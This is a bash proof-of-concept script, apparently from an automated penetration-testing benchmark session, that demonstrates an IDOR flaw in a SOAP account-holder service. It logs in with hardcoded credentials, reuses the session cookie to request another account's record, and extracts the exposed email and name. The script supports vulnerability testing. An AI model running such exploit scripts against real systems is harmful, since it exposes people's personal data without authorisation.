#!/bin/bash
# POC: IDOR vulnerability in GetAccountHolderInfo SOAP service - demonstrates unauthorized access to account holder PII with corrected SOAP format
# Target: ./repo
# Created: 2025-11-05T17:01:12.108Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# IDOR Vulnerability POC: GetAccountHolderInfo SOAP Service
# This POC demonstrates that an authenticated user can access PII of any account holder
# by manipulating the account_id parameter without authorization checks

TARGET_URL="${1:-http://localhost}"

echo "=========================================="
echo "IDOR Vulnerability POC: GetAccountHolderInfo"
echo "=========================================="
echo "Target: $TARGET_URL/soap_service"
echo ""

# Step 1: Authenticate as 'john' to get a valid session
echo "[*] Step 1: Authenticating as user 'john'"
echo ""

LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  -i)

# Extract session cookie from the response
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie" | grep -oP '(?<=session=)[^;]*' | head -1)

if [ -z "$SESSION_COOKIE" ]; then
    echo "[-] Failed to obtain session cookie"
    echo "[-] Full response:"
    echo "$LOGIN_RESPONSE"
    exit 1
fi

echo "[+] Successfully authenticated"
echo "[+] Session Cookie: $SESSION_COOKIE"
echo ""

# Step 2: Access account holder info for an arbitrary account_id (999999)
echo "[*] Step 2: Attempting to access account holder info for account_id=999999"
echo ""

# Try with simplified XML format
SOAP_REQUEST='<GetAccountHolderInfoRequest><account_id>999999</account_id></GetAccountHolderInfoRequest>'

echo "[*] Sending SOAP Request:"
echo "$SOAP_REQUEST"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL/soap_service" \
  -H "Content-Type: text/xml" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "$SOAP_REQUEST")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if response contains sensitive data
if echo "$RESPONSE" | grep -qE "(account_id|name|email)"; then
    if echo "$RESPONSE" | grep -q "999999"; then
        echo "[+] VULNERABILITY CONFIRMED!"
        echo "[+] Unauthorized access to account holder information succeeded"
        
        if echo "$RESPONSE" | grep -q "<email>"; then
            EMAIL=$(echo "$RESPONSE" | grep -oP '(?<=<email>)[^<]*')
            echo "[+] PII exposed: Email address = $EMAIL"
        fi
        
        if echo "$RESPONSE" | grep -q "<name>"; then
            NAME=$(echo "$RESPONSE" | grep -oP '(?<=<name>)[^<]*')
            echo "[+] PII exposed: Full name = $NAME"
        fi
        
        echo ""
        echo "[!] Impact: Authenticated user 'john' can access PII of any account holder"
        exit 0
    fi
fi

echo "[-] No account holder data in response or unexpected format"
exit 1